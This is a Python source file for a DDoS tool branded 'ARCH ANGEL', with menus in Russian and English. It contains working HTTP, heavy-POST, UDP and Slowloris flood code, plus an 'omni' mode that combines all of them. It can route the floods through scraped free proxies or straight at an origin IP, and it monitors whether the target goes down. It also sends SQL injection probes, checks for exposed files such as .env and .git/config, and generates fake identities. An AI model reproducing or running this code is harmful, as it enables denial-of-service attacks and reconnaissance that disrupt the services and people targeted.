import os
import time
import sys
import random
import threading
import requests
import socket
import ssl
import colorama
from colorama import Fore, Style, Back
import string
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

colorama.init(autoreset=True)
if os.name == 'nt':
    import ctypes
    ctypes.windll.kernel32.SetConsoleCP(65001)
    ctypes.windll.kernel32.SetConsoleOutputCP(65001)

BANNER = f"""
{Fore.RED}
 █▀▀█ █▀▀█ █▀▀█ ░░▀ █▀▀ █▀▀ ▀▀█▀▀ {Fore.WHITE}█▀▀ █▀▀█ █▀▀▄ 
 █░░█ █▄▄▀ █░░█ ░░█ █▀▀ █░░ ░░█░░ {Fore.WHITE}█░ █░░█ █░░█ 
 █▀▀▀ ▀░▀▀ ▀▀▀▀ █▄█ ▀▀▀ ▀▀▀ ░░▀░░ {Fore.WHITE}▀▀▀ ▀▀▀▀ ▀▀▀░
{Fore.YELLOW}     ARCH ANGEL      | DDoS ATTACK 
"""

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
        ]

    def update(self):
        self.proxies = []
        print(f"{Fore.YELLOW}[GRID] СКАНИРОВАНИЕ ПРОКСИ-НОД (GITHUB API)...")
        for s in self.sources:
            try:
                r = requests.get(s, timeout=5)
                for line in r.text.splitlines():
                    if ":" in line: 
                        self.proxies.append(line.strip())
            except: pass
        
    
        self.proxies = list(set(self.proxies))
        print(f"{Fore.GREEN}[GRID] ИНИЦИАЛИЗИРОВАНО {len(self.proxies)} АГЕНТОВ.")
        return self.proxies


class UdpStresser:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.active = False
    
    def run(self):
        self.active = True
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.active:
            try:
            
                payload = os.urandom(4096)
                s.sendto(payload, (self.host, self.port))
            except: pass

class SlowSocketStresser:
    def __init__(self, host, port, use_ssl):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.active = False
        self.sockets = []
    
    def run(self):
        self.active = True
        while self.active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if self.use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                
                s.settimeout(4)
                s.connect((self.host, self.port))
        
                s.send(f"POST /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
                s.send(f"Content-Length: 1000000\r\n".encode("utf-8")) # Lie about content length
                s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                self.sockets.append(s)
            except: 
                pass
            

            for s in list(self.sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except:
                    self.sockets.remove(s)
            
            time.sleep(15) 

class VortexStresser:

    def __init__(self, host, port, use_ssl, path):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.active = False
    
    def run(self):
        self.active = True

        junk_data = "".join(random.choices(string.ascii_letters + string.digits, k=16384))
        
        while self.active:
            sock = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if self.use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(s, server_hostname=self.host)
                else:
                    sock = s
                
                sock.connect((self.host, self.port))
                
                payload = (
                    f"POST {self.path} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: TitanVortex/1.0\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(junk_data)}\r\n"
                    f"\r\n"
                    f"{junk_data}"
                ).encode('utf-8')
                
                sock.sendall(payload)
                sock.close()
            except:
                if sock: sock.close()



class BrowserFingerprint:
    def __init__(self):
        self.os_list = [
            'Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 10_15_7',
            'X11; Linux x86_64', 'iPhone; CPU iPhone OS 16_6 like Mac OS X'
        ]
        self.browser_list = [
            ('Chrome', '120.0.0.0'), ('Firefox', '115.0'), ('Safari', '605.1.15'), ('Edge', '120.0.0.0')
        ]
    
    def get(self):
        os_str = random.choice(self.os_list)
        browser, ver = random.choice(self.browser_list)
        
        headers = {
            'User-Agent': f'Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{ver} Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        return headers

class TitanEngine:
    def __init__(self):
        self.active = False
        self.stats = {'reqs': 0, 'sent': 0, 'fails': 0}
        self.server_health = {'status': 'UNKNOWN', 'latency': 0, 'code': 0}
        self.target_host = ""
        self.target_port = 80
        self.target_path = "/"
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self.proxies = []
        self.use_proxies = False
        # Pulse Sync Barrier
        self.pulse_event = threading.Event()
        self.pulse_active = False

    def parse_url(self, url):
        parsed = urlparse(url)
        self.target_host = parsed.hostname 
        self.target_path = parsed.path or "/"
        if parsed.port:
            self.target_port = parsed.port
        elif parsed.scheme == "https":
            self.target_port = 443
        else:
            self.target_port = 80
        self.use_ssl = (parsed.scheme == "https")

    def attack(self, url, threads=100, direct_ip=None, use_proxies=False, mode='http', pulse=False):
        self.active = True
        self.stats = {'reqs': 0, 'sent': 0, 'fails': 0}
        self.server_health = {'status': 'Checking...', 'latency': 0, 'code': 0}
        self.parse_url(url)
        self.direct_ip = direct_ip 
        self.use_proxies = use_proxies
        self.pulse_active = pulse 
        
        target_ip = self.direct_ip if self.direct_ip else self.target_host

        print(f"{Fore.RED}[TITAN X] ЗАГРУЗКА ЛЕГИОНА ({threads} BROWSER AGENTS)...")
        print(f"{Fore.MAGENTA}[TITAN] ЦЕЛЬ: {self.target_host}:{self.target_port}")
        
        if self.use_proxies:
            self.proxies = ProxyManager().update()
            if not self.proxies: return

        threading.Thread(target=self._monitor, daemon=True).start()
        threading.Thread(target=self._heartbeat, daemon=True).start()
        
        if self.pulse_active:
             threading.Thread(target=self._pulse_master, daemon=True).start()
        
        if mode == 'omni':
            print(f"{Fore.RED}!!! ЗАПУСК ПРОТОКОЛА ТОТАЛЬНОГО УНИЧТОЖЕНИЯ !!!")
            
            for i in range(int(threads * 0.4)):
                 threading.Thread(target=self._worker, args=('chaos',), daemon=True).start()
            
            print(f"{Fore.RED}[+] VORTEX GRAVITY WELL ACTIVATED (Heavy POST)")
            for i in range(int(threads * 0.4)):
                vx = VortexStresser(target_ip, self.target_port, self.use_ssl, self.target_path)
                threading.Thread(target=vx.run, daemon=True).start()

            print(f"{Fore.RED}[+] UDP RAILGUN ACTIVATED")
            udp = UdpStresser(target_ip, self.target_port)
            threading.Thread(target=udp.run, daemon=True).start()
            
            print(f"{Fore.RED}[+] SLOWLORIS VENOM ACTIVATED")
            slow = SlowSocketStresser(target_ip, self.target_port, self.use_ssl)
            threading.Thread(target=slow.run, daemon=True).start()
            
        elif mode == 'udp':
            print(f"{Fore.RED}[+] UDP ARTILLERY ACTIVATED")
            udp = UdpStresser(target_ip, self.target_port)
            for _ in range(threads): # Launch multiple UDP threads
                threading.Thread(target=udp.run, daemon=True).start()
        elif mode == 'slow':
            print(f"{Fore.RED}[+] SLOW POISON ACTIVATED")
            slow = SlowSocketStresser(target_ip, self.target_port, self.use_ssl)
            for _ in range(threads): # Launch multiple Slow Socket threads
                threading.Thread(target=slow.run, daemon=True).start()
        else: # Default to HTTP flood
            print(f"{Fore.MAGENTA}[TITAN] СИНХРОНИЗАЦИЯ {threads} БРАУЗЕРОВ...")
            for i in range(threads):
                threading.Thread(target=self._worker, args=('chaos',), daemon=True).start()

    def stop(self):
        self.active = False

    def _pulse_master(self):

        while self.active:
            time.sleep(0.1) 
            self.pulse_event.set() 
            self.pulse_event.clear()

    def _monitor(self):
        start = time.time()
        while self.active:
            elapsed = time.time() - start
            if elapsed > 0:
                rps = self.stats['reqs'] / elapsed
                h_color = Fore.GREEN
                if self.server_health['latency'] > 1000: h_color = Fore.YELLOW
                if self.server_health['code'] >= 500 or self.server_health['latency'] > 5000: h_color = Fore.RED
                health_str = f"{h_color}PING: {int(self.server_health['latency'])}ms [{self.server_health['code']}]"
                type_str = "PULSE" if self.pulse_active else "FLOOD"
                
                print(f"\r{Fore.CYAN}[TITAN {type_str}] REQ/s: {int(rps)} | HITS: {self.stats['reqs']} | DROPPED: {self.stats['fails']} | {health_str}   ", end="")
            time.sleep(0.5)

    def _heartbeat(self):
        while self.active:
            try:
                start_h = time.time()
                t_host = f"http{'s' if self.use_ssl else ''}://{self.target_host}:{self.target_port}{self.target_path}"
                if(self.direct_ip):
                     s = socket.create_connection((self.direct_ip, self.target_port), timeout=2)
                     s.close()
                     self.server_health = {'status': 'ALIVE', 'latency': (time.time()-start_h)*1000, 'code': 200}
                else:
                    r = requests.get(t_host, timeout=3)
                    self.server_health = {'status': 'ALIVE', 'latency': (time.time()-start_h)*1000, 'code': r.status_code}
            except Exception:
                 self.server_health = {'status': 'DOWN', 'latency': 9999, 'code': 0}
            time.sleep(1)

    def _proxy_worker(self, mode):
        while self.active:

             pass
             
    def _worker(self, mode):
        fingerprint = BrowserFingerprint()
        fp_headers = fingerprint.get() 
        
        connect_host = self.direct_ip if self.direct_ip else self.target_host
        
        request_template = (
            "{method} {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
        )
        
        header_str = ""
        for k, v in fp_headers.items():
            header_str += f"{k}: {v}\r\n"
            
        while self.active:
            if self.pulse_active:
                self.pulse_event.wait()
            
            sock = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if self.use_ssl:
                    sock = self.ssl_context.wrap_socket(s, server_hostname=self.target_host)
                else:
                    sock = s
                sock.connect((connect_host, self.target_port))
                
                ref = random.randint(1, 999999)
                method = "POST" if random.random() > 0.5 else "GET"
                path = f"{self.target_path}?v={ref}"
                
                payload = request_template.format(method=method, path=path, host=self.target_host)
                payload += header_str + "\r\n"
                
                if method == "POST":
                    body = f"data={ref}&timestamp={time.time()}"
                    payload += f"Content-Length: {len(body)}\r\n\r\n{body}"
                else:
                    payload += "\r\n"
                    
                sock.sendall(payload.encode('utf-8'))
                self.stats['reqs'] += 1
                sock.close() 
                
            except Exception:
                self.stats['fails'] += 1
                if sock: 
                    try: sock.close()
                    except: pass

class IdentityCore:
    @staticmethod
    def generate():
        return {
            "login": f"User{random.randint(1000,9999)}",
            "password": "".join(random.choices(string.ascii_letters, k=12)),
            "email": f"user{random.randint(1000,9999)}@gmail.com"
        }

class PhantomBrowser:
    def __init__(self):
        self.session = requests.Session()
    
    def run(self):
        print(f"\n{Fore.GREEN}WEB MODE ACTIVATED. Вводите URL.")
        url = input("URL > ")
        if not url.startswith("http"): url = "https://" + url
        try:
            r = self.session.get(url, timeout=5)
            print(f"{Fore.CYAN}STATUS: {r.status_code}")
            print(f"{Fore.WHITE}{r.text[:500]}...")
        except Exception as e:
            print(f"{Fore.RED}Err: {e}")

class TitanAuditor:
    def __init__(self, core):
        self.core = core
        self.vulnerabilities = []

    def run(self, url):
        self.vulnerabilities = []
        print(f"{Fore.RED}[ARCH ANGEL] Skan: {url}")
        print(f"{Fore.MAGENTA}[AUDIT] 1 step: SQLi")
        self.scan_sql(url)
        
        print(f"{Fore.MAGENTA}[AUDIT] 2 step: Recon")
        self.scan_files(url)
        
        print(f"\n{Fore.CYAN}--- REPORT ---{Style.RESET_ALL}")
        if self.vulnerabilities:
            for v in self.vulnerabilities:
                print(f"[{Fore.RED}VULN{Style.RESET_ALL}] {v}")
            print(f"{Fore.YELLOW}WARNING: Found vulnerabilities!")
        else:
            print(f"{Fore.GREEN}No vulnerabilities found clean or protected server")

    def scan_sql(self, url):
        if "?" not in url:
            print(f"{Fore.YELLOW}[SKIP] Нет GET-параметров для проверки SQLi.")
            return

        payloads = ["'", "\"", "';", "')"]
        errors = [
            "SQL syntax", "mysql_fetch", "native client", "PostgreSQL", 
            "syntax error", "ORA-", "SQLite"
        ]
        
        target = url
        for p in payloads:
            test_url = f"{target}{p}"
            try:
                r = self.core.session.get(test_url, timeout=5)
                for err in errors:
                    if err.lower() in r.text.lower():
                        msg = f"SQL Injection (Error Based) найден: {test_url} -> Выдало ошибку: {err}"
                        if msg not in self.vulnerabilities:
                            self.vulnerabilities.append(msg)
                            print(f"{Fore.RED}[!] НАЙДЕНА ДЫРА: {msg}")
            except Exception as e:
                pass

    def scan_files(self, base_url):
        parsed = urlparse(base_url)
        root = f"{parsed.scheme}://{parsed.netloc}"
        
        files = [
            ".env", "config.php.bak", "db.sql", "backup.zip", ".git/config", 
            "robots.txt", "phpinfo.php"
        ]
        
        for f in files:
            target = f"{root}/{f}"
            try:
                r = self.core.session.get(target, timeout=3)
                if r.status_code == 200:

                    if len(r.text) > 0 and "html" not in r.text.lower():
                        msg = f"Доступен чувствительный файл: {target} (Код: 200)"
                        self.vulnerabilities.append(msg)
                        print(f"{Fore.RED}[!] ФАЙЛ НАЙДЕН: {target}")
            except: pass

def main():
    titan_engine = TitanEngine() 
    browser = PhantomBrowser()
    core_net = PhantomBrowser().session 

    class AuditCore:
         def __init__(self): self.session = requests.Session()
    
    auditor = TitanAuditor(AuditCore())

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        print(f"{Fore.CYAN} [1] PHANTOM BROWSER")
        print(f"{Fore.RED} [2] ARCH ANGEL (DIRECT/LOCAL)")
        print(f"{Fore.RED} [3] STOP LOAD")
        print(f"{Fore.MAGENTA} [4] ARCH AUDITOR (SCANNER)") 
        print(f"{Fore.GREEN} [5] IDENTITY GEN")
        print(f"{Fore.YELLOW} [6] ARCH GLOBAL GRID (DISTRIBUTED PROXY ATTACK)")
        print(f"{Fore.RED} [7] ARCH OMNI (ALL VECTORS: TCP+UDP+SLOW)")
        print(f"{Fore.WHITE} [0] EXIT")
        
        c = input(f"\n{Fore.RED}ARCH ANGEL v8.0 (OMNI) > {Fore.WHITE}")
        
        if c == '1': 
            browser.run()
            input("Enter...")
        elif c == '2':
            url = input("URL: ")
            direct_ip = input("ORIGIN IP (Optional): ").strip() or None
            try: th = int(input("THREADS: "))
            except: th = 100
            titan_engine.attack(url, th, direct_ip, use_proxies=False)
            input(f"\n{Fore.RED}Enter to stop...")
            titan_engine.stop()
        elif c == '3': titan_engine.stop()
        elif c == '4':
            url = input("URL: ")
            auditor.run(url); input("\n...")
        elif c == '5': 
            print(IdentityCore.generate()); input("...")
        elif c == '6':
            print(f"{Fore.YELLOW}ВНИМАНИЕ: Режим GRID использует бесплатные прокси.")
            url = input("URL: ")
            try: th = int(input("THREADS (Rec 50-200): "))
            except: th = 100
            titan_engine.attack(url, th, use_proxies=True)
            input(f"\n{Fore.RED}Enter to stop...")
            titan_engine.stop()
        elif c == '7':
            print(f"{Fore.RED}ВНИМАНИЕ: OMNI MODE использует ВСЕ ресурсы системы.")
            url = input("URL: ")
            direct_ip = input("ORIGIN IP (Optional): ").strip() or None
            try: th = int(input("THREADS (Rec 100-500): "))
            except: th = 200
            titan_engine.attack(url, th, direct_ip, mode='omni')
            input(f"\n{Fore.RED}Enter to stop...")
            titan_engine.stop()
        elif c == '0': sys.exit()

if __name__ == "__main__":
    main()
